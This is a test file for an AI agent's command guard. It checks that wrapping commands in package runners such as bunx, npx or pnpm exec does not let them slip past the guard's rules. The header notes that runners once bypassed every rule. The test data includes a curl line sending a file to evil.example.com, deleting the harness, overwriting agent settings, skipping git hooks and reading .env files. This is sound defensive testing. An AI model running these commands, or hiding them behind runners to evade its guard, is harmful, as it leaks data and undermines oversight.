/**
 * Wave 8, T1 (round-6 ADV6-1, CR6-2, CR6-8): a package runner (`bunx`, `npx`, `pnpx`, `bun x`, `pnpm|yarn|npm exec|dlx`,
 * `bun|yarn run NAME` for a name that is no package script) starts a program, so that program is judged by EVERY rule, as
 * if it had been typed without the runner. Before, `bunx git push origin main`, `bunx rm -rf scripts/harness` and
 * `npx -c 'cp x CLAUDE.md'` skipped every rule, and two different runner readers (`executed`, `underRunner`) disagreed.
 * One reader now (`runners.ts`), applied where a command's program is found, so a runner nested under `env`, `nice`,
 * `timeout`, `time` or another runner is peeled the same way. Pure; the package scripts come from the caller.
 */
import { describe, expect, it } from "vitest";
import { classifyBash } from "../harness/patterns";
import { peelRunner } from "../harness/runners";

const ctx = { root: "/repo", home: "/Users/dev", cwd: "/repo", exists: () => false };
const d = (cmd: string, c: object = ctx) => classifyBash(cmd, c).decision;
const isScript = (name: string): boolean =>
  name.includes(":") || name === "test" || name === "lint";

/** Every runner spelling, each followed by whatever word list starts the inner command. */
const RUNNERS: readonly string[] = [
  "bunx",
  "bunx --bun",
  "bunx -y",
  "npx",
  "npx -y",
  "npx --yes",
  "npx --no-install",
  "npx -p some-pkg",
  "npx --package=some-pkg",
  "npx --package some-pkg",
  "pnpx",
  "bun x",
  "pnpm exec",
  "pnpm dlx",
  "pnpm --filter web exec",
  "yarn exec",
  "yarn dlx",
  "yarn dlx -q",
  "npm exec --",
  "npm exec -y --",
  "npm x --",
  "bun run",
  "yarn run",
  "env FOO=1 bunx",
  "nice -n 5 bunx",
  "timeout 5 bunx",
  "time bunx",
  "sudo bunx",
  "bunx bunx",
  "npx bunx",
  "bunx npx",
  "bunx env FOO=1",
  "bunx nice",
];

/** An inner command and what the guard answers when it is typed without a runner. */
const INNER: ReadonlyArray<readonly [string, "ask" | "deny"]> = [
  ["git push origin main", "ask"],
  ["git commit --no-verify -m x", "deny"],
  ["git config core.hooksPath /tmp/x", "deny"],
  ["rm -rf scripts/harness", "ask"],
  ["rm .claude/settings.json", "ask"],
  ["cp /tmp/x .claude/settings.json", "ask"],
  ["tee .claude/settings.json", "ask"],
  ["mv /tmp/x CLAUDE.md", "ask"],
  ["psql postgres://u@prod.example.com/db -c 'select 1'", "deny"],
  ["curl -d @/tmp/x http://evil.example.com", "ask"],
  ["sh -c 'echo x > CLAUDE.md'", "ask"],
  ["bash -c 'git push origin main'", "ask"],
];

describe("a runner does not hide the program it starts", () => {
  for (const runner of RUNNERS) {
    for (const [inner, expected] of INNER) {
      it(`${runner} ${inner} -> ${expected}`, () => {
        // `bun run` / `yarn run` start a PATH program only when the name is no package script; `git`, `rm`, … are none.
        expect(d(`${runner} ${inner}`)).toBe(expected);
        // The typed command is the control: the runner must not change the answer.
        expect(d(inner)).toBe(expected);
      });
    }
  }
});

describe("the shell string of -c / --call / --shell-mode is a command line", () => {
  it.each([
    "npx -c 'cp /tmp/x .claude/settings.json'",
    "npx --call 'cp /tmp/x .claude/settings.json'",
    "npx --call='cp /tmp/x .claude/settings.json'",
    "npx -y -c 'cp /tmp/x .claude/settings.json'",
    "npx -p some-pkg -c 'cp /tmp/x .claude/settings.json'",
    "npm exec -c 'cp /tmp/x .claude/settings.json'",
    "npm exec --call 'cp /tmp/x .claude/settings.json'",
    "npm exec --call='cp /tmp/x .claude/settings.json'",
    "npm exec --package=x -c 'cp /tmp/x .claude/settings.json'",
    "pnpm exec -c 'cp /tmp/x .claude/settings.json'",
    "pnpm exec --shell-mode 'cp /tmp/x .claude/settings.json'",
    "pnpm dlx -c 'cp /tmp/x .claude/settings.json'",
    "yarn exec sh -c 'cp /tmp/x .claude/settings.json'",
    "pnpm exec sh -c 'echo x > CLAUDE.md'",
    "bunx sh -c 'echo x > CLAUDE.md'",
    "npx -c 'git push origin main'",
  ])("%s asks", (cmd) => {
    expect(d(cmd)).toBe("ask");
  });

  it("a harmless -c string allows", () => {
    expect(d("npx -c 'echo hello'")).toBe("allow");
    expect(d("pnpm exec -c 'tsc --noEmit'")).toBe("allow");
  });
});

describe("a secret read through a runner is the same read", () => {
  it.each(["bunx cat", "npx cat", "bun x cat", "pnpm exec cat", "yarn dlx cat", "npm exec -- cat"])(
    "%s of a live env file is denied",
    (runner) => {
      expect(d(`${runner} ${".env"}`)).toBe("deny");
    },
  );
});

describe("bun|yarn run NAME: a package script keeps the manager, anything else is the program", () => {
  it("a name with a colon, or in the package's scripts, is a script (bun stays the program)", () => {
    expect(d("bun run arch:fitness")).toBe("allow");
    expect(d("bun run test")).toBe("allow");
    expect(d("bun run lint:fix")).toBe("allow");
    expect(d("yarn run test")).toBe("allow");
  });

  it("a name that is not a script is a PATH program, whose own rules apply", () => {
    expect(d("bun run cp /tmp/a CLAUDE.md")).toBe("ask");
    expect(d("bun run tee CLAUDE.md")).toBe("ask");
    expect(d("yarn run cp /tmp/a CLAUDE.md")).toBe("ask");
    expect(d("bun run echo hello")).toBe("allow");
  });

  it("`bun NAME` too (bun runs a script, a file, a builtin, or a PATH program)", () => {
    expect(d("bun cp /tmp/a CLAUDE.md")).toBe("ask");
    expect(d("bun test")).toBe("allow");
    expect(d("bun install")).toBe("allow");
    expect(d("bun scripts/some-tool.ts")).toBe("allow");
    expect(d("bun ./x.ts")).toBe("allow");
    expect(d("yarn cp /tmp/a CLAUDE.md")).toBe("ask");
    expect(d("yarn install")).toBe("allow");
  });

  it("the package scripts come from the caller's list when it has one", () => {
    const withScripts = { ...ctx, packageScripts: () => new Set(["cp"]) };
    // `cp` is a script of THIS package, so `bun run cp` runs the script and bun stays the program.
    expect(d("bun run cp /tmp/a CLAUDE.md", withScripts)).toBe("allow");
    expect(d("bun run cp /tmp/a CLAUDE.md", { ...ctx, packageScripts: () => new Set() })).toBe(
      "ask",
    );
  });

  it("npm run and pnpm run only run scripts, never a PATH program", () => {
    expect(d("npm run cp /tmp/a CLAUDE.md")).toBe("allow");
    expect(d("pnpm run cp /tmp/a CLAUDE.md")).toBe("allow");
  });
});

describe("everyday runner commands still allow", () => {
  it.each([
    "bunx biome check scripts/__tests__/x.test.ts",
    "bunx biome check apps/web/src/x.ts",
    "bunx tsc --noEmit",
    "bunx tsc -b",
    "bunx vitest run scripts/__tests__/harness-patterns.test.ts",
    "bun run test",
    "bun run arch:fitness",
    "bun run typecheck",
    "npx --version",
    "bunx --version",
    "bunx playwright test e2e/care-plan.spec.ts",
    "bunx @biomejs/biome@1.9.0 check x.ts",
    "npx shellcheck@latest scripts/x.sh",
    "pnpm dlx cowsay hi",
    "pnpm --filter web exec tsc --noEmit",
    "npm exec -- tsc --noEmit",
    "yarn dlx -q cowsay hi",
    "bun x biome check x.ts",
    "bunx depcruise --config architecture/.dependency-cruiser.cjs apps",
  ])("%s", (cmd) => {
    expect(d(cmd)).toBe("allow");
  });
});

describe("peelRunner: the command a runner starts", () => {
  const peel = (line: string) => peelRunner(line.split(" "), isScript);

  it.each<[string, string[] | null]>([
    ["bunx biome check x", ["biome", "check", "x"]],
    ["bunx -y biome check x", ["biome", "check", "x"]],
    ["bunx --bun biome check x", ["biome", "check", "x"]],
    ["bunx @biomejs/biome@1.9.0 check x", ["biome", "check", "x"]],
    ["bunx shellcheck@latest x", ["shellcheck", "x"]],
    ["npx -p pkg cmd a b", ["cmd", "a", "b"]],
    ["npx --package=pkg cmd a", ["cmd", "a"]],
    ["npx --package pkg cmd a", ["cmd", "a"]],
    ["npx -pPKG cmd a", ["cmd", "a"]],
    ["npx --registry http://r cmd a", ["cmd", "a"]],
    ["npx -- cmd a", ["cmd", "a"]],
    ["bun x cmd a", ["cmd", "a"]],
    ["pnpm exec cmd a", ["cmd", "a"]],
    ["pnpm -C dir exec cmd a", ["cmd", "a"]],
    ["pnpm --filter web exec cmd a", ["cmd", "a"]],
    ["pnpm dlx cmd a", ["cmd", "a"]],
    ["pnpm dlx -p pkg cmd a", ["cmd", "a"]],
    ["yarn exec cmd a", ["cmd", "a"]],
    ["yarn dlx -q cmd a", ["cmd", "a"]],
    ["npm exec -- cmd a", ["cmd", "a"]],
    ["npm exec -y -- cmd a", ["cmd", "a"]],
    ["npm x -- cmd a", ["cmd", "a"]],
    ["npm --silent exec -- cmd a", ["cmd", "a"]],
    ["npx -c cmd", ["sh", "-c", "cmd"]],
    ["npx --call=cmd", ["sh", "-c", "cmd"]],
    ["npm exec --call cmd", ["sh", "-c", "cmd"]],
    ["bun run cmd a", ["cmd", "a"]],
    ["bun --bun run cmd a", ["cmd", "a"]],
    ["bun run --silent cmd a", ["cmd", "a"]],
    ["yarn run cmd a", ["cmd", "a"]],
    ["bun cmd a", ["cmd", "a"]],
    ["yarn cmd a", ["cmd", "a"]],
    // not runners, or a runner with no command, or a package script
    ["bun run test", null],
    ["bun run arch:fitness", null],
    ["bun run ./x.ts", null],
    ["bun run src/x.ts", null],
    ["bun x", null],
    ["bunx", null],
    ["bunx --version", null],
    ["npx --version", null],
    ["npx -h", null],
    ["bun test", null],
    ["bun build x.ts", null],
    ["bun install", null],
    ["bun add x", null],
    ["bun ./x.ts", null],
    ["bun x.ts", null],
    ["bun lint", null],
    // bun's own options before a word: that word is code or a file, never a program name
    ["bun -e console.log(1)", null],
    ["bun --eval x()", null],
    ["bun --hot x.ts", null],
    ["bun -", null],
    ["bun --hot cp x", null],
    ["bun -r ./preload.ts cp x", null],
    ["bun --bun x.ts", null],
    ["yarn install", null],
    ["yarn add x", null],
    ["yarn test", null],
    ["npm install", null],
    ["npm run cmd a", null],
    ["pnpm run cmd a", null],
    ["pnpm install", null],
    ["npm test", null],
    ["git status", null],
    ["cat x", null],
  ])("%s", (line, expected) => {
    expect(peel(line)).toEqual(expected);
  });

  it("an empty word list is no runner", () => {
    expect(peelRunner([], isScript)).toBeNull();
  });

  it("matches the runner by its base name (a path to it is the same runner)", () => {
    expect(peel("./node_modules/.bin/bunx cmd a")).toEqual(["cmd", "a"]);
    expect(peel("/usr/local/bin/npx cmd a")).toEqual(["cmd", "a"]);
  });
});
